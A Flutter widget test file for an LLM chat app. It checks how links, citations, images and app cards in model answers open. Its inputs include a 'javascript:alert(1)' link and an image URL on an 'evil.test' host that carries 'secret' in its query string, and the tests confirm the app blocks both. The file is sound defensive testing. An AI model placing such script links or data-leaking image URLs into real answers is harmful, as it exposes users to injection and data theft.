import 'package:anywherellm/core/server_models.dart';
import 'package:anywherellm/ui/chat/browser_sheet.dart';
import 'package:anywherellm/ui/chat/page_sheet.dart';
import 'package:anywherellm/ui/state/shell_controller.dart';
import 'package:anywherellm/ui/state/notice.dart';
import 'package:flutter/material.dart';
import 'package:flutter_test/flutter_test.dart';

import '../support/fake_api.dart';
import '../support/pixels.dart';
import '../support/pump.dart';

/// Taps the middle of the link whose text is [text] in a selectable answer, as a person does.
Future<void> tapLink(WidgetTester tester, String text) async {
  for (final element in find.byType(SelectableText).evaluate()) {
    final selectable = element.widget as SelectableText;
    final start = selectable.textSpan?.toPlainText().indexOf(text) ?? -1;
    if (start < 0) continue;
    final editable = tester
        .state<EditableTextState>(
          find.descendant(
            of: find.byWidget(selectable),
            matching: find.byType(EditableText),
          ),
        )
        .renderEditable;
    final box = editable
        .getBoxesForSelection(
          TextSelection(baseOffset: start, extentOffset: start + text.length),
        )
        .first
        .toRect();
    await tester.tapAt(editable.localToGlobal(box.center));
    await tester.pump(const Duration(milliseconds: 500));
    return;
  }
  fail('no link "$text"');
}

void main() {
  testWidgets('a link in an answer opens in the browser', (tester) async {
    final h = await pumpApp(
      tester,
      llm: answering('Read [the report](https://example.com/report) today.'),
    );
    await tapLink(tester, 'the report');
    expect(h.opened, [Uri.parse('https://example.com/report')]);
    expect(h.chat.linkNotice, isNull);
  });

  testWidgets('a link the app will not open says so', (tester) async {
    final h = await pumpApp(
      tester,
      llm: answering('Click [here](javascript:alert(1)) now.'),
    );
    await tapLink(tester, 'here');
    expect(h.opened, isEmpty);
    expect(h.chat.linkNotice?.title, 'Could not open the link');
    expect(h.chat.linkNotice?.text, contains('javascript: links'));
    expect(h.chat.linkNotice?.text, isNot(contains('alert')));
    expect(find.text('Could not open the link'), findsOneWidget);
    await tester.pump(const Duration(seconds: 6));
    expect(h.chat.linkNotice, isNull);
    expect(find.text('Could not open the link'), findsNothing);
  });

  testWidgets('a link notice shows beside a server problem, not over it', (
    tester,
  ) async {
    final h = await pumpApp(
      tester,
      llm: answering('Click [here](javascript:alert(1)) now.'),
    );
    h.chat.problem = const Notice('Could not read the workspaces', 'Down.');
    await tapLink(tester, 'here');
    expect(find.text('Could not read the workspaces'), findsOneWidget);
    expect(find.text('Could not open the link'), findsOneWidget);
    await tester.pump(const Duration(seconds: 6));
    expect(h.chat.problem?.title, 'Could not read the workspaces');
  });

  testWidgets('an opener that throws an error gives the notice', (
    tester,
  ) async {
    final h = await pumpApp(
      tester,
      llm: answering('Read [the report](https://example.com/report).'),
    );
    h.openThrows = ArgumentError('unsupported');
    await tapLink(tester, 'the report');
    expect(h.chat.linkNotice?.text, contains('Nothing on this device opened'));
    await tester.pump(const Duration(seconds: 6));
  });

  testWidgets('a link nothing on the device opens says so', (tester) async {
    final h = await pumpApp(
      tester,
      llm: answering('Mail [me](mailto:ada@example.com).'),
    );
    h.openSucceeds = false;
    await tapLink(tester, 'me');
    expect(h.opened, [Uri.parse('mailto:ada@example.com')]);
    expect(h.chat.linkNotice?.text, contains('Nothing on this device opened'));
    await tester.pump(const Duration(seconds: 6));
  });

  testWidgets(
    'a web citation opens its page; a file one lights up in Sources',
    (tester) async {
      final h = await pumpApp(
        tester,
        llm: answering(
          'Done.',
          cited: [
            Citation('A story', url: Uri.parse('https://news.test/story')),
            const Citation('Q3 roadmap.pdf'),
          ],
        ),
      );
      await tester.tap(control('Source 1: A story, opens in the browser'));
      await tester.pump();
      expect(h.opened, [Uri.parse('https://news.test/story')]);
      await tester.tap(control('Source 2: Q3 roadmap.pdf'));
      await tester.pump();
      expect(h.opened, hasLength(1));
      expect(h.sources.flashed, isNotNull);
      await tester.pumpAndSettle(const Duration(seconds: 2));
    },
  );

  testWidgets('an image loads only from the server\'s own host', (
    tester,
  ) async {
    final llm = answering(
      'Card:\n\n[![Report](https://h:8080/card.png)](https://h:8080/r)\n\n'
      'Elsewhere: ![tracker](https://evil.test/p.png?d=secret)',
    )..images[Uri.parse('https://h:8080/card.png')] = pixel;
    await pumpApp(tester, llm: llm);
    await tester.pumpAndSettle();
    expect(find.byType(Image), findsOneWidget);
    expect(find.text('[tracker: evil.test]'), findsOneWidget);
    expect(llm.calls.where((c) => c.startsWith('answerImage')), [
      'answerImage:https://h:8080/card.png',
    ]);
  });

  testWidgets('a skill\'s card on the server loads and opens there', (
    tester,
  ) async {
    final llm =
        answering(
            'Done.\n\n[![Example](/browser-lean/3kQ-card.jpg?v=1)](/browser-lean/3kQ.html)',
          )
          ..images[Uri.parse('https://h:3001/browser-lean/3kQ-card.jpg?v=1')] =
              pixel;
    final h = await pumpApp(tester, llm: llm);
    await tester.pumpAndSettle();
    expect(find.byType(Image), findsOneWidget);
    // The test's one-pixel picture is drawn at no size, so the link around it is tapped as
    // its gesture would.
    tester
        .widget<GestureDetector>(
          find.ancestor(
            of: find.byType(Image),
            matching: find.byType(GestureDetector),
          ),
        )
        .onTap!();
    await tester.pump(const Duration(milliseconds: 500));
    expect(h.opened, [Uri.parse('https://h:3001/browser-lean/3kQ.html')]);
    expect(h.chat.linkNotice, isNull);
  });

  testWidgets(
    'a skill\'s tab opens the agent\'s browser in a sheet over the chat',
    (tester) async {
      final h = await pumpApp(
        tester,
        llm: answering('Done: [the tab](/browser-lean/3kQ.html)'),
        canViewApps: true,
      );
      await tapLink(tester, 'the tab');
      await tester.pumpAndSettle();
      final page = Uri.parse('https://h:3001/browser-lean/3kQ.html');
      expect(h.shell.browserTab, page);
      expect(find.text('Web view of $page'), findsOneWidget);
      expect(h.opened, isEmpty);
      // The page's own Back closes it, as its window.close() does.
      h.appView!.close!();
      await tester.pumpAndSettle();
      expect(h.shell.browserTab, isNull);
      await tapLink(tester, 'the tab');
      await tester.pumpAndSettle();
      await tester.binding.handlePopRoute();
      await tester.pumpAndSettle();
      expect(h.shell.browserTab, isNull);
    },
  );

  testWidgets('an apps-lean app\'s page opens in a sheet over the chat', (
    tester,
  ) async {
    final h = await pumpApp(
      tester,
      llm: answering('Made it: [Groceries](/apps-lean/q9Zx_-1aB2.html)'),
      canViewApps: true,
    );
    await tapLink(tester, 'Groceries');
    await tester.pumpAndSettle();
    final page = Uri.parse('https://h:3001/apps-lean/q9Zx_-1aB2.html');
    expect(h.shell.popup.value, isA<PageOpen>());
    expect(find.byType(PageSheet), findsOneWidget);
    expect(find.text('Web view of $page'), findsOneWidget);
    expect(h.opened, isEmpty);
    // The page's own close shuts the sheet, and so does Back.
    h.appView!.close!();
    await tester.pumpAndSettle();
    expect(find.byType(PageSheet), findsNothing);
    await tapLink(tester, 'Groceries');
    await tester.pumpAndSettle();
    await tester.binding.handlePopRoute();
    await tester.pumpAndSettle();
    expect(find.byType(PageSheet), findsNothing);
  });

  testWidgets('an app\'s card in an answer is one tap that opens its page', (
    tester,
  ) async {
    final h = await pumpApp(
      tester,
      llm: answering(
        'Done.\n\n> [**Groceries**](/apps-lean/q9Zx_-1aB2.html)\n> Added Oat milk and Coffee',
      ),
      canViewApps: true,
    );
    expect(find.text('Groceries'), findsOneWidget);
    expect(find.text('Added Oat milk and Coffee'), findsOneWidget);
    await tester.tap(
      control('Groceries, Added Oat milk and Coffee, Open the app'),
    );
    await tester.pumpAndSettle();
    expect(h.shell.popup.value, isA<PageOpen>());
    expect(find.byType(PageSheet), findsOneWidget);
  });

  testWidgets('a paragraph that opens with an app\'s link is its card too', (
    tester,
  ) async {
    final h = await pumpApp(
      tester,
      llm: answering('[Groceries](/apps-lean/q9Zx_-1aB2.html) - Added Tea'),
      canViewApps: true,
    );
    await tester.tap(control('Groceries, Added Tea, Open the app'));
    await tester.pumpAndSettle();
    expect(h.shell.popup.value, isA<PageOpen>());
  });

  testWidgets('a quote that is not an app\'s card stays a quote', (
    tester,
  ) async {
    await pumpApp(
      tester,
      llm: answering('> [Groceries](https://evil.test/apps-lean/q9Z.html)'),
      canViewApps: true,
    );
    expect(control('Groceries, Open the app'), findsNothing);
  });

  testWidgets('without a web view an apps-lean page opens in the browser', (
    tester,
  ) async {
    final h = await pumpApp(
      tester,
      llm: answering('Made it: [Groceries](/apps-lean/q9Zx_-1aB2.html)'),
    );
    await tapLink(tester, 'Groceries');
    expect(h.opened, [Uri.parse('https://h:3001/apps-lean/q9Zx_-1aB2.html')]);
  });

  testWidgets(
    'the bar under the agent\'s browser hands the tab back and messages the agent',
    (tester) async {
      final llm = answering('Done: [the tab](/browser-lean/3kQ.html)');
      final h = await pumpApp(tester, llm: llm, canViewApps: true);
      await tapLink(tester, 'the tab');
      await tester.pumpAndSettle();
      final page = h.appView!.channel!;
      expect(page.name, 'AnywhereLLMBrowser');
      expect(find.text('Hand back'), findsNothing);

      // The page says the person took the tab over: Send reads Hand back.
      page.onMessage('{"who":"user"}');
      await tester.pumpAndSettle();
      await tester.tap(control('Hand back to the agent'));
      await tester.pump();
      expect(h.appView!.ran, ['window.browserLean&&browserLean.give()']);
      page.onMessage('{"gave":true}');
      await tester.pumpAndSettle();
      expect(find.text('Hand back'), findsNothing);

      // Taken over again, a message hands the tab back before it goes in the chat.
      page.onMessage('{"who":"user"}');
      await tester.pumpAndSettle();
      llm.answer = 'Booked for Tuesday.';
      final bar = find.descendant(
        of: find.byType(AgentBar),
        matching: find.byType(EditableText),
      );
      await tester.enterText(bar, 'Book Tuesday');
      await tester.pump();
      await tester.tap(control('Send to the agent'));
      await tester.pump();
      expect(h.appView!.ran, hasLength(2));
      expect(llm.calls.where((c) => c.startsWith('streamChat')), isEmpty);
      page.onMessage('{"gave":true}');
      await tester.pump(const Duration(seconds: 1));
      await tester.pump(const Duration(seconds: 1));
      expect(find.text('You: Book Tuesday'), findsOneWidget);
      expect(find.text('Booked for Tuesday.'), findsWidgets);
      await tester.tap(control('Dismiss the reply'));
      await tester.pump(const Duration(seconds: 1));
      expect(find.text('You: Book Tuesday'), findsNothing);
    },
  );
}
